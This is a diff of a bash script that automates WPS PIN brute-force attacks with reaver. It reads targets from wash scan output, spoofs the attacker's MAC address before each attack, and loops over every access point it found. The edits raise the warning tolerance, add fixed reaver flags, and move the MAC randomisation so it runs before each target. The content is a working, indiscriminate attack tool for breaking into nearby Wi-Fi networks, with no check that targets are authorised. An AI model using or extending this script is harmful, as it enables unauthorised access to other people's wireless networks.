@@ -10,7 +10,10 @@ wash_timeout=30
 reaver_delay=0
 
 # Max continuous WARNINGS
-reaver_attemps=3
+reaver_attemps=20
+
+# Base config parameters to reaver
+reaver_base="-a -f -w -vv"
 
 e() {
     echo ""
@@ -43,7 +46,7 @@ resetInterface() {
         airmon-ng stop $interface > /dev/null
     done
 
-    echo ""
+    e "Generate Random MAC Address for $wireless_interface"
 
     ifconfig $wireless_interface down
 
@@ -149,6 +152,8 @@ cat "$logs/wash.log" | grep "[A-Z0-9][A-Z0-9]:[A-Z0-9][A-Z0-9]:" | tr -s ' ' | w
         continue
     fi
 
+    resetInterface
+
     e "Starting reaver"
 
     echo "Line: $line"
@@ -156,7 +161,7 @@ cat "$logs/wash.log" | grep "[A-Z0-9][A-Z0-9]:[A-Z0-9][A-Z0-9]:" | tr -s ' ' | w
     echo "MAC Address: $mac"
     echo "Log: logs/$mac.log"
 
-    reaver_options="-a -f -c $channel -i mon0 -b $mac -m $(getMac) -d $reaver_delay -vv"
+    reaver_options=$reaver_base" -i mon0 -c $channel -b $mac -m $(getMac) -d $reaver_delay"
 
     if [ "$(echo $line | grep Yes)" != "" ]; then
         reaver_options=$reaver_options" -L"
@@ -166,11 +171,9 @@ cat "$logs/wash.log" | grep "[A-Z0-9][A-Z0-9]:[A-Z0-9][A-Z0-9]:" | tr -s ' ' | w
         reaver_options=$reaver_options" -S"
     fi
 
-    if [ "$pixiewps" != "" ]; then
-        reaver_options=$reaver_options" --pixie-dust=1"
-    fi
-
-    resetInterface
+#    if [ "$pixiewps" != "" ]; then
+#        reaver_options=$reaver_options" --pixie-dust=1"
+#    fi
 
     e "Command: reaver $reaver_options"
 
@@ -186,7 +189,9 @@ cat "$logs/wash.log" | grep "[A-Z0-9][A-Z0-9]:[A-Z0-9][A-Z0-9]:" | tr -s ' ' | w
             break
         fi
 
-        if [ "$(tail -20 "$logs/$mac.log" | grep "WARNING" | wc -l)" -gt $reaver_attemps ]; then
+	lines=$(($reaver_attemps * 2))
+
+        if [ "$(tail -$lines "$logs/$mac.log" | grep "WARNING" | wc -l)" -gt $reaver_attemps ]; then
             e "Stopped (too many warnings)" >> "$logs/$mac.log"
             killProcess reaver
             break
